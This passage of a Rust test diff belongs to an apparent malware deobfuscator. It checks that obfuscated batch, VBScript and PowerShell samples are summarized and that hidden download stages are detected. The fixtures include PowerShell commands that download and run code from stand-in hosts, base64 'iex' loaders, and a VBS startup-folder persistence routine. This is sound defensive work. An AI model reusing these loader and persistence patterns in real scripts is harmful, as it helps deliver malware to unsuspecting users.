+        let text = format!(
+            "@echo off\r\n{noise}\r\npowershell -c \"iwr https://medium-alpha-noise.example/p.ps1\"\r\n"
+        );
+        let mut env = crate::Environment::new(&Config::default());
+        let summarized = crate::summarize_long_alpha_echo_lines(&text, &mut env)
+            .expect("medium alpha noise should be summarized");
+
+        assert!(
+            summarized.contains("bytes from long plain alpha noise line"),
+            "medium alpha noise was not summarized:\n{}",
+            summarized
+        );
+        assert!(
+            summarized.contains("powershell -c"),
+            "command after alpha noise was not preserved:\n{}",
+            summarized
+        );
+        assert!(
+            !summarized.contains(&noise[..512]),
+            "raw medium alpha noise leaked into output"
+        );
+    }
+
+    #[test]
+    fn large_winrm_vbs_utility_carrier_is_summarized_around_suspicious_lines() {
+        let mut text = String::from(
+            "private function CreateSession(wsman, conStr, optDic, claim)\r\n\
+             set grisu = wsman.CreateSession(conStr, grisuFlags, conOpt)\r\n\
+             dialect = \"http://schemas.dmtf.org/wbem/wsman/1/wsman/SelectorFilter\"\r\n",
+        );
+        for idx in 0..900 {
+            text.push_str(&format!(
+                "ASSERTBOOL optDic.ArgumentExists(NPARA_{idx}), \"stock winrm validation {idx}\"\r\n"
+            ));
+        }
+        text.push_str(
+            "Set WshShell = CreateObject(\"WScript.Shell\")\r\n\
+             Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n\
+             originador = \"recoleta.vbs\"\r\n\
+             enloisar = WshShell.SpecialFolders(\"Startup\")\r\n\
+             mortulho = enloisar & \"\\\" & originador\r\n\
+             fso.CopyFile estrefura, mortulho\r\n\
+             decathlo = \"cmd.exe /c ping 127.0.0.1 -n 10 & powershell -command \" & hipercloridria\r\n\
+             WshShell.Run decathlo, 0, true\r\n",
+        );
+        for idx in 0..900 {
+            text.push_str(&format!(
+                "stdErr.WriteLine resurgimento(\"stock winrm formatting {idx}\")\r\n"
+            ));
+        }
+
+        let mut env = crate::Environment::new(&Config::default());
+        let summarized = crate::summarize_large_vbs_utility_carrier(&text, &mut env)
+            .expect("large WinRM VBS carrier should be summarized");
+
+        assert!(
+            summarized.contains("WinRM/VBScript utility carrier lines"),
+            "carrier boilerplate was not summarized:\n{}",
+            summarized
+        );
+        assert!(
+            summarized.contains("fso.CopyFile estrefura, mortulho")
+                && summarized.contains("powershell -command")
+                && summarized.contains("WshShell.Run decathlo"),
+            "suspicious VBS context was not preserved:\n{}",
+            summarized
+        );
+        assert!(
+            !summarized.contains("stock winrm validation 200")
+                && !summarized.contains("stock winrm formatting 200"),
+            "stock carrier boilerplate leaked into summary"
+        );
+    }
+
+    #[test]
+    fn vbs_base64_string_carrier_is_summarized_and_scanned() {
+        use base64::Engine as _;
+
+        let decoded = "Invoke-WebRequest -Uri 8LUhttps://vbs-b64-carrier.example/stage.ps18LU -OutFile 5dYenv:TEMP\\stage.ps1\r\n"
+            .repeat(8);
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let chunks = b64
+            .as_bytes()
+            .chunks(96)
+            .map(|chunk| {
+                std::str::from_utf8(chunk)
+                    .expect("base64 is utf8")
+                    .to_string()
+            })
+            .collect::<Vec<_>>();
+        let mut text = String::from("Set WshShell = CreateObject(\"WScript.Shell\")\r\n");
+        text.push_str(&format!("artralgia = \"{}\"\r\n", chunks[0]));
+        for chunk in &chunks[1..] {
+            text.push_str(&format!("artralgia = artralgia & \"{}\"\r\n", chunk));
+        }
+        text.push_str("WshShell.Run artralgia, 0, False\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let summarized = crate::summarize_vbs_base64_string_carriers(&text, &mut env)
+            .expect("VBS base64 string carrier should be summarized");
+
+        assert!(
+            summarized.contains("rem omitted VBS base64 string carrier for artralgia"),
+            "carrier summary missing:\n{}",
+            summarized
+        );
+        assert!(
+            !summarized.contains(&chunks[0][..80]),
+            "raw base64 chunk leaked into summary:\n{}",
+            summarized
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    | Trait::DownloadInDeobText { src, .. }
+                    if src == "https://vbs-b64-carrier.example/stage.ps1"
+            )),
+            "decoded carrier URL was not scanned: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn large_static_for_data_list_is_summarized() {
+        let mut text = String::from("@echo off\r\nset f=\r\nfor %%# in (\r\n");
+        let first_row = "8b351c9c-f398-4515-9900-09df49427262_XGVPP-NMH47-7TTHJ-W3FW7-8H%f%V2C___4_X19-99683_HGNKjkKcKQHO6n8srMUrDh/MElffBZarLqCMD9rWtgFKf3YzYOLDPEMGhuO/auNMKCeiU7ebFbQALS/MyZ7TvidMQ2dvzXeXXKzPBjfwQx549WJUU7qAQ9Txg9cR9SAT8b12Pry2iBk+nZWD9VtHK3kOnEYkvp5WTCTsrSi6Re4_0_OEM:NONSLP_Enterprise";
+        text.push_str(first_row);
+        text.push_str("\r\n");
+        for idx in 0..40 {
+            text.push_str(&format!(
+                "c83cef07-6b72-4bbc-a28f-a00386872839_3V6Q6-NQXCX-V8YXR-9QCYV-QP%f%FCT__{idx}_X19-98746_NHn2n0N1UfVf00CfaI5LCDMDsKdVAWpD/HAfUrcTAKsw9d2Sks4h5MhyH/WUx+B6dFi8ol7D3AHorR8y9dqVS1Bd2FdZNJl/tTR1PGwYn6KL88NS19aHmFNdX8s4438vaa+Ty8Qk8EDcwm/wscC8lQmi3/RgUKYdyGFvpbGSVlk_0_Volume:MAK_EnterpriseN\r\n"
+            ));
+        }
+        text.push_str(") do (\r\necho %%#\r\n)\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let summarized = crate::summarize_large_static_for_data_lists(&text, &mut env)
+            .expect("static FOR data list should be summarized");
+
+        assert!(
+            summarized.contains("static FOR data rows") && summarized.contains("echo %%#"),
+            "static FOR data summary/body missing:\n{}",
+            summarized
+        );
+        assert!(
+            !summarized.contains(first_row),
+            "raw static FOR data row leaked:\n{}",
+            summarized
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::LineTruncated { .. })),
+            "static FOR data summary did not emit cap trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn large_public_activation_utility_is_summarized_without_timeout_work() {
+        let mut text = String::from(
+            "@echo off\r\n\
+             title  Microsoft_Activation_Scripts 2.7\r\n\
+             :: Homepage: mass grave[.]dev\r\n\
+             :hwiddata\r\n\
+             :ohookdata\r\n\
+             :kms38data\r\n\
+             :ksdata\r\n",
+        );
+        text.push_str(&"rem static activation table row\r\n".repeat(10_000));
+
+        let mut env = crate::Environment::new(&Config::default());
+        let report = crate::summarize_large_public_activation_utility_report(
+            &text,
+            text.len(),
+            &mut env,
+            Config::default().max_traits_per_kind,
+        )
+        .expect("large public activation utility should be summarized");
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("large public activation utility body"),
+            "activation utility summary missing:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::LineTruncated { .. })),
+            "activation utility summary did not emit cap trait: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn public_activation_utility_summary_rejects_external_urls() {
+        let mut text = String::from(
+            "@echo off\r\n\
+             title  Microsoft_Activation_Scripts 2.7\r\n\
+             :: Homepage: mass grave[.]dev\r\n\
+             :hwiddata\r\n\
+             :ohookdata\r\n\
+             :kms38data\r\n\
+             :ksdata\r\n\
+             echo http://activation-wrapper.example/payload.ps1\r\n",
+        );
+        text.push_str(&"rem static activation table row\r\n".repeat(10_000));
+
+        let mut env = crate::Environment::new(&Config::default());
+        let report = crate::summarize_large_public_activation_utility_report(
+            &text,
+            text.len(),
+            &mut env,
+            Config::default().max_traits_per_kind,
+        );
+
+        assert!(
+            report.is_none(),
+            "activation utility with external URL should not be summarized"
+        );
+    }
+
+    #[test]
+    fn powershell_scriptparts_base64_carrier_is_extracted_and_summarized() {
+        use std::fmt::Write as _;
+
+        let decoded =
+            "function Invoke-Stage {\nInvoke-WebRequest https://scriptparts.example/p.ps1\n}\n"
+                .repeat(40);
+        let mut chunks = String::new();
+        for (idx, chunk) in decoded.as_bytes().chunks(48).enumerate() {
+            let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, chunk);
+            write!(
+                chunks,
+                "# Section {}\r\n$index_{idx} = {idx}\r\n$part_{idx} = Convert-Base64 -EncodedText \"{b64}\"\r\n$scriptParts += $part_{idx}\r\n",
+                idx + 1
+            )
+            .expect("write to String");
+        }
+        let text = format!(
+            "$scriptParts = @()\r\n{chunks}# Verify script components\r\n$finalScript = [string]::Join('', $scriptParts)\r\nInvoke-Expression $finalScript\r\n"
+        );
+        let mut env = crate::Environment::new(&Config::default());
+        let summarized = crate::summarize_powershell_scriptparts_base64_carrier(&text, &mut env)
+            .expect("scriptParts carrier should be summarized");
+
+        assert!(
+            summarized.contains("PowerShell scriptParts base64 carrier")
+                && summarized.contains("# Verify script components")
+                && !summarized.contains("$part_20 = Convert-Base64"),
+            "scriptParts carrier was not summarized correctly:\n{}",
+            summarized
+        );
+        assert!(
+            env.all_extracted_ps1.iter().any(|payload| {
+                String::from_utf8_lossy(payload).contains("https://scriptparts.example/p.ps1")
+            }),
+            "decoded scriptParts payload was not recorded: {:?}",
+            env.all_extracted_ps1
+        );
+    }
+
+    #[test]
+    fn percent_chain_alpha_echo_noise_is_summarized_on_fast_path() {
+        let mut script = String::from("@echo off\r\nset e=e\r\nset c=c\r\nset h=h\r\nset o=o\r\nset a=abcdefghijklmnopqrstuvwxyz\r\n");
+        script.push_str("%e%%c%%h%%o%");
+        for _ in 0..32768 {
+            script.push_str("%a%");
+        }
+        script.push_str("\r\n");
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "percent-chain alpha echo noise should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("bytes from long alpha echo line"),
+            "percent-chain alpha echo noise was not summarized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn unicode_marker_islands_are_stripped_from_final_deob_buffer() {
+        let script = "e%┌( ಠ_ಠ)┘ヾ(⌐■_■)ノ%cho of%◯س﷽تﯤس%f\r\ns已法製et X=1\r\nif noﮕ◯t def字神ined X exit\r\n";
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            report.deobfuscated.contains("echo off")
+                && report.deobfuscated.contains("set X=1")
+                && report.deobfuscated.contains("if not defined X exit"),
+            "unicode marker islands were not cleaned:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("ಠ") && !report.deobfuscated.contains("已法製"),
+            "unicode marker islands leaked into output:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn repeated_identical_long_output_lines_are_coalesced() {
+        let repeated = "set RNTOwxZwRSBrjxPKzamgeOeBnyhfxzzdoJLfvfERXELYqDMFWPNmBgWd=value";
+        let mut script = String::from("@echo off\r\n");
+        for _ in 0..16 {
+            script.push_str(repeated);
+            script.push_str("\r\n");
+        }
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 15 repeated identical output lines"),
+            "repeated output lines were not coalesced:\n{}",
+            report.deobfuscated
+        );
+        assert_eq!(
+            report.deobfuscated.matches(repeated).count(),
+            1,
+            "only the first repeated line should remain:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn adjacent_duplicate_idempotent_commands_are_coalesced() {
+        let script = br#"@echo off
+title hellow
+title hellow
+set "zipUrl=https://duplicate-idempotent.example/payload.zip"
+set "zipUrl=https://duplicate-idempotent.example/payload.zip"
+echo keep
+echo keep
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert_eq!(
+            report.deobfuscated.matches("title hellow").count(),
+            1,
+            "duplicate title command leaked:\n{}",
+            report.deobfuscated
+        );
+        assert_eq!(
+            report
+                .deobfuscated
+                .matches(r#"set "zipUrl=https://duplicate-idempotent.example/payload.zip""#)
+                .count(),
+            1,
+            "duplicate SET assignment leaked:\n{}",
+            report.deobfuscated
+        );
+        assert_eq!(
+            report.deobfuscated.matches("echo keep").count(),
+            2,
+            "non-idempotent duplicate echo should be preserved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn repeated_colon_marker_lines_are_summarized_without_hiding_labels() {
+        let mut script = String::new();
+        for _ in 0..20 {
+            script.push_str(":#############################\r\n");
+        }
+        script.push_str("SET !A=E\r\n");
+        script.push_str(":Payload\r\n");
+        script.push_str("powershell -c \"iwr http://marker.example/payload.png\"\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.deobfuscated.contains("repeated colon marker lines"),
+            "colon marker summary missing:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(":################"),
+            "raw colon marker lines leaked:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains(":Payload")
+                && report
+                    .deobfuscated
+                    .contains("http://marker.example/payload.png"),
+            "real label or command was dropped:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn repeated_vbs_msgbox_noop_fragments_are_stripped_from_echo_lines() {
+        let noop = r#"If fakeGuard = "never" then msgbox "noise marker" End If"#;
+        let mut text = String::new();
+        for _ in 0..8 {
+            text.push_str("echo ");
+            text.push_str(noop);
+            text.push(':');
+            text.push_str(noop);
+            text.push_str("\r\n");
+        }
+        text.push_str("echo Set sh = CreateObject(\"WScript.Shell\"):");
+        text.push_str(noop);
+        text.push_str("\r\n");
+        text.push_str("echo sh.Exec(\"payload.exe\")\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::strip_repeated_vbs_msgbox_noop_fragments(&text, &mut env)
+            .expect("repeated VBS MsgBox no-op fragments should be stripped");
+
+        assert!(
+            cleaned.contains("VBS MsgBox no-op echo lines"),
+            "pure no-op echo lines should be summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("fakeGuard"),
+            "raw no-op fragments leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("CreateObject(\"WScript.Shell\")")
+                && cleaned.contains("sh.Exec(\"payload.exe\")"),
+            "useful VBS lines were dropped:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn spaced_hex_blob_lines_are_summarized_after_repeated_output_coalesce() {
+        let hex_blob = "30 82 01 0a 02 82 01 01 00 c6 70 a0 d7 fd 91 b6 a5 a0 60 84 35 02 93 65 d1 1e 52 9a 2d 43 df 54 68 03 57 ad 83 df b4 ee 6c bf 54 d7 4c 4b c9 20 5f bb ca 3b 43 6d 0f e3 37 0b 32 00 d8 c6 55 e2 42 c9 2b 4b 2a 2f a6 04 0c 81 e5 30 fc c1 a6 0d 84 9d 52 88 6b f3 e2";
+        let mut script =
+            String::from("@echo off\r\nstart msedge.exe \"https://example.test/doc\"\r\n");
+        for _ in 0..12 {
+            script.push_str(hex_blob);
+            script.push_str("\r\n");
+        }
+        script.push_str("set www.microsoft.com=qaFDwHtb90Qjr47LpWfRyl5MAKkh3OYuimSXBG18zeg2xTcsI6nPUdovZNVJCE\r\n");
+        script.push_str(hex_blob);
+        script.push_str("\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.deobfuscated.contains("start msedge.exe"),
+            "real command should remain:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("spaced-hex blob lines"),
+            "spaced hex carrier should be summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .deobfuscated
+                .contains("repeated identical output lines"),
+            "spaced hex carrier should not be summarized as generic repeated output:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("30 82 01 0a"),
+            "raw spaced hex leaked into output:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn adjacent_rendered_percent_noise_summaries_are_coalesced() {
+        let text = concat!(
+            "@echo off\r\n",
+            "rem omitted long unresolved percent-noise line (582 bytes)\r\n",
+            "rem omitted 2 long unresolved percent-noise lines (1682 bytes)\r\n",
+            "rem omitted long unresolved percent-noise line (679 bytes)\r\n",
+            "powershell -c \"Write-Host kept\"\r\n",
+        );
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::coalesce_long_unresolved_percent_noise_summary_lines(text, &mut env)
+            .expect("adjacent percent-noise summaries should coalesce");
+
+        assert!(
+            cleaned.contains("rem omitted 4 long unresolved percent-noise lines (2943 bytes)"),
+            "coalesced percent-noise summary missing:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("powershell -c"),
+            "real command after summaries should remain:\n{}",
+            cleaned
+        );
+        assert_eq!(
+            cleaned
+                .matches("long unresolved percent-noise line")
+                .count(),
+            1,
+            "individual percent summary lines leaked:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn giant_percent_noise_line_is_summarized_before_timeout() {
+        let config = Config {
+            timeout_secs: 2,
+            ..Config::default()
+        };
+        let script = format!("@echo off\r\n{}\r\n", "%UNSET%".repeat(1_800_000));
+        let report = analyze(script.as_bytes(), &config);
+
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|trait_| matches!(trait_, Trait::TimeoutHit)),
+            "oversize percent-noise line should be summarized before materialization times out:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("long unresolved percent-noise line"),
+            "oversize percent-noise line should be summarized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn glued_start_option_check_handles_cjk_prefix() {
+        assert!(crate::prefix_ends_with_glued_start_option("SET 贝贝/min"));
+        assert!(!crate::prefix_ends_with_glued_start_option(
+            "SET 贝贝豆克艾克饿克贝克="
+        ));
+    }
+
+    #[test]
+    fn adjacent_percent_noise_summaries_with_markers_are_coalesced() {
+        let text = concat!(
+            "@echo off\r\n",
+            "rem omitted 22 long unresolved percent-noise lines (20661 bytes)\r\n",
+            "rem omitted 178 long unresolved percent-noise lines (190751 bytes; markers: QEMU)\r\n",
+            "rem omitted 1446 long unresolved percent-noise lines (1788858 bytes; markers: QEMU)\r\n",
+            "rem omitted 8 long unresolved percent-noise lines (8647 bytes)\r\n",
+            "rem omitted 9092063 opaque payload bytes\r\n",
+        );
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::coalesce_long_unresolved_percent_noise_summary_lines(text, &mut env)
+            .expect("adjacent marker percent-noise summaries should coalesce");
+
+        assert!(
+            cleaned.contains(
+                "rem omitted 1654 long unresolved percent-noise lines (2008917 bytes; markers: QEMU)"
+            ),
+            "coalesced marker percent-noise summary missing:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("rem omitted 9092063 opaque payload bytes"),
+            "following payload summary should remain:\n{}",
+            cleaned
+        );
+        assert_eq!(
+            cleaned
+                .matches("long unresolved percent-noise line")
+                .count(),
+            1,
+            "individual marker percent summary lines leaked:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn percent_var_chain_with_nested_systemroot_materializes_powershell_stage() {
+        use base64::Engine as _;
+
+        let stage = "Invoke-WebRequest -Uri https://nested-systemroot-chain.example/payload";
+        let utf16: Vec<u8> = stage.encode_utf16().flat_map(u16::to_le_bytes).collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let pieces = vec![
+            r#"set P01=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe "#.to_string(),
+            r#"set P02=-Command ""#.to_string(),
+            "set P03=$x='".to_string(),
+            format!("set P04={b64}"),
+            r#"set P05=';"#.to_string(),
+            r#"set P06=$s=[Text.Encoding]::Unicode.GetString("#.to_string(),
+            r#"set P07=[Convert]::FromBase64String($x));"#.to_string(),
+            r#"set P08=iex $s""#.to_string(),
+            "set P09= ".to_string(),
+            "set P10= ".to_string(),
+            "set P11= ".to_string(),
+            "set P12= ".to_string(),
+            "set P13= ".to_string(),
+            "set P14= ".to_string(),
+            "set P15= ".to_string(),
+            "set P16= ".to_string(),
+        ];
+        let mut script = String::from("@echo off\r\n");
+        for piece in pieces {
+            script.push_str(&piece);
+            script.push_str("\r\n");
+        }
+        script.push_str(
+            "%P01%%P02%%P03%%P04%%P05%%P06%%P07%%P08%%P09%%P10%%P11%%P12%%P13%%P14%%P15%%P16%\r\n",
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|trait_| matches!(
+                trait_,
+                Trait::Download { src, .. }
+                    if src == "https://nested-systemroot-chain.example/payload"
+            )),
+            "nested SYSTEMROOT percent-chain PowerShell stage was not scanned: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn goto_ordered_percent_var_chain_materializes_nested_start_process_powershell_stage() {
+        use base64::Engine as _;
+
+        let stage = "Invoke-WebRequest -Uri https://goto-percent-chain.example/payload";
+        let utf16: Vec<u8> = stage.encode_utf16().flat_map(u16::to_le_bytes).collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let mut script = String::from("@echo off\r\ngoto p01\r\n");
+        script.push_str(":run\r\n");
+        for idx in 1..=120 {
+            script.push_str(&format!("%SOSTVAR{idx:03}%"));
+        }
+        script.push_str("\r\n");
+        script.push_str("goto done\r\n");
+        script.push_str(":p01\r\nset SOSTVAR001=%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Start-Process %SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -ArgumentList '-Command \\\"$x = ''\r\ngoto p02\r\n");
+        script.push_str(&format!(":p02\r\nset SOSTVAR002={b64}\r\ngoto p03\r\n"));
+        script.push_str(":p03\r\nset SOSTVAR003='';$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($x));iex $s\\\"'\"\r\ngoto p04\r\n");
+        for idx in 4..=120 {
+            let next = if idx == 120 {
+                "run".to_string()
+            } else {
+                format!("p{:02}", idx + 1)
+            };
+            script.push_str(&format!(
+                ":p{idx:02}\r\nset SOSTVAR{idx:03}= \r\ngoto {next}\r\n"
+            ));
+        }
+        script.push_str(":done\r\necho DONE\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|trait_| matches!(
+                trait_,
+                Trait::Download { src, .. }
+                    if src == "https://goto-percent-chain.example/payload"
+            )),
+            "goto-ordered percent-chain PowerShell stage was not scanned: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .deobfuscated
+                .contains("rem omitted long unresolved percent-noise line"),
+            "materialized PowerShell carrier was still summarized as unresolved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn fast_percent_var_chain_expands_nested_percent_refs_in_values() {
+        let mut env = crate::Environment::new(&Config::default());
+        env.set("SYSTEMROOT", r"C:\WINDOWS");
+        env.set(
+            "P01",
+            r#"%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe "#,
+        );
+        for idx in 2..=31 {
+            env.set(&format!("P{idx:02}"), "x");
+        }
+        env.set("P32", " | Sort-Object Name; $bytes[$idx%5] <<END>>");
+        let line = concat!(
+            "%P01%%P02%%P03%%P04%%P05%%P06%%P07%%P08%",
+            "%P09%%P10%%P11%%P12%%P13%%P14%%P15%%P16%",
+            "%P17%%P18%%P19%%P20%%P21%%P22%%P23%%P24%",
+            "%P25%%P26%%P27%%P28%%P29%%P30%%P31%%P32%",
+        );
+
+        let expanded = crate::fast_expand_percent_var_chain_line(line, &env)
+            .expect("nested percent refs should not reject the whole chain");
+
+        assert!(
+            expanded.contains(r"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"),
+            "nested SYSTEMROOT ref was not expanded: {expanded}"
+        );
+        assert!(
+            !expanded.contains("%SYSTEMROOT%"),
+            "nested SYSTEMROOT ref leaked: {expanded}"
+        );
+        assert!(
+            expanded.contains("$bytes[$idx%5]"),
+            "literal PowerShell modulo percent should remain: {expanded}"
+        );
+    }
+
+    #[test]
+    fn percent_var_chain_preserves_batch_meta_refs_in_powershell_loader() {
+        let mut env = crate::Environment::new(&Config::default());
+        let pieces = [
+            (
+                "P01",
+                "echo cls;powershell -w hidden;function decrypt_function($param_var){",
+            ),
+            (
+                "P02",
+                "$aes_var=[System.Security.Cryptography.Aes]::Create();",
+            ),
+            ("P03", "$host.UI.RawUI.WindowTitle='%~f0';"),
+            (
+                "P04",
+                "Invoke-WebRequest -Uri https://batch-meta-percent-chain.example/payload;",
+            ),
+            ("P05", "execute_function $payload3_var (,[string[]]('%*'));"),
+            (
+                "P06",
+                " | \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\"",
+            ),
+            ("P07", " "),
+            ("P08", " "),
+            ("P09", " "),
+            ("P10", " "),
+            ("P11", " "),
+            ("P12", " "),
+            ("P13", " "),
+            ("P14", " "),
+            ("P15", " "),
+            ("P16", " "),
+            ("P17", " "),
+            ("P18", " "),
+            ("P19", " "),
+            ("P20", " "),
+            ("P21", " "),
+            ("P22", " "),
+            ("P23", " "),
+            ("P24", " "),
+            ("P25", " "),
+            ("P26", " "),
+            ("P27", " "),
+            ("P28", " "),
+            ("P29", " "),
+            ("P30", " "),
+            ("P31", " "),
+            ("P32", " "),
+        ];
+        for (name, value) in pieces {
+            env.set(name, value);
+        }
+        let line = concat!(
+            "%P01%%P02%%P03%%P04%%P05%%P06%%P07%%P08%",
+            "%P09%%P10%%P11%%P12%%P13%%P14%%P15%%P16%",
+            "%P17%%P18%%P19%%P20%%P21%%P22%%P23%%P24%",
+            "%P25%%P26%%P27%%P28%%P29%%P30%%P31%%P32%",
+        );
+
+        let materialized = crate::materialized_percent_noise_action_line(line, &env)
+            .expect("PowerShell loader chain with batch meta refs should materialize");
+
+        assert!(
+            materialized.contains("%~f0") && materialized.contains("%*"),
+            "batch meta refs should be preserved:\n{}",
+            materialized
+        );
+        assert!(
+            materialized.contains("https://batch-meta-percent-chain.example/payload"),
+            "payload URL disappeared from materialized command:\n{}",
+            materialized
+        );
+    }
+
+    #[test]
+    fn percent_var_chain_echoed_powershell_loader_is_scanned_end_to_end() {
+        let pieces = [
+            (
+                "P01",
+                "echo cls;powershell -w hidden;function decrypt_function($param_var){",
+            ),
+            ("P02", "$host.UI.RawUI.WindowTitle='%~f0';"),
+            (
+                "P03",
+                "Invoke-WebRequest -Uri https://batch-meta-percent-chain-e2e.example/payload;",
+            ),
+            ("P04", "execute_function $payload3_var (,[string[]]('%*'));"),
+            (
+                "P05",
+                " | \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\"",
+            ),
+        ];
+        let mut script = String::from("@echo off\r\n");
+        for (name, value) in pieces {
+            script.push_str(&format!("set \"{name}={value}\"\r\n"));
+        }
+        for idx in 6..=32 {
+            script.push_str(&format!("set \"P{idx:02}= \"\r\n"));
+        }
+        script.push_str(concat!(
+            "%P01%%P02%%P03%%P04%%P05%%P06%%P07%%P08%",
+            "%P09%%P10%%P11%%P12%%P13%%P14%%P15%%P16%",
+            "%P17%%P18%%P19%%P20%%P21%%P22%%P23%%P24%",
+            "%P25%%P26%%P27%%P28%%P29%%P30%%P31%%P32%\r\n",
+        ));
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|trait_| matches!(
+                trait_,
+                Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                    if src == "https://batch-meta-percent-chain-e2e.example/payload"
+            )),
+            "materialized echoed PowerShell loader URL was not scanned: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn percent_setter_alias_fragments_materialize_before_percent_noise_summary() {
+        let url = "https://setter-alias-percent-chain.example/payload.exe";
+        let mut script = String::from("@echo off\r\nset \"setter=set \"\r\n");
+        for idx in 1..=64 {
+            let value = match idx {
+                1 => "\"powershell",
+                2 => " -NoProfile",
+                3 => " -Command",
+                4 => " Invoke-WebRequest https://setter-alias-percent-chain.example/payload.exe -OutFile stage.exe",
+                5 => " ; Write-Output '%~f0'",
+                _ => " ",
+            };
+            script.push_str(&format!("%setter%\"Fragment{idx:03}Token={value}\"\r\n"));
+        }
+        for idx in 1..=64 {
+            script.push_str(&format!("%Fragment{idx:03}Token%"));
+        }
+        script.push_str("\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|trait_| matches!(
+                trait_,
+                Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                    if src == url
+            )),
+            "setter-alias PowerShell fragments were not scanned: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .deobfuscated
+                .contains("rem omitted long unresolved percent-noise line"),
+            "setter-alias command was summarized before fragment expansion:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("Write-Output"),
+            "batch-meta-bearing setter-alias fragment was dropped:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn percent_setter_alias_preserves_renamed_powershell_command_line() {
+        let mut script = String::from("@echo off\r\nset \"setter=set \"\r\n");
+        for idx in 1..=64 {
+            let value = match idx {
+                1 => "\"%~nx0.",
+                2 => "exe\"",
+                3 => " -NoProfile",
+                4 => " -Command",
+                5 => " $stage = [System.IO.File]::ReadAllText('%~f0');",
+                _ => " ",
+            };
